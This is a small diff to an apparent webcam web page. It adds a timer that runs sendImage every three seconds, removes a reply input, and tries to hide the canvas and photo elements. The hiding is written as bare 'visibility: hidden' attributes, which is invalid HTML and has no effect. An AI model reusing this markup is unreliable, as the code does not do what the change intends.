@@ -47,15 +47,14 @@
   <div class="camera">
     <video id='video' style="max-width: 100%; height: auto;" autoplay muted playsinline></video>
     <button id="startbutton">Take photo</button> 
-    <p><input id="reply"/></p>
     <script>
       var b = setInterval(sendImage, 3000);
     </script>
   </div>
-  <canvas id="canvas">
+  <canvas id="canvas" visibility: hidden>
   </canvas>
   <div class="output">
-    <img id="photo">
+    <img id="photo" visibility: hidden>
   </div>
   
 
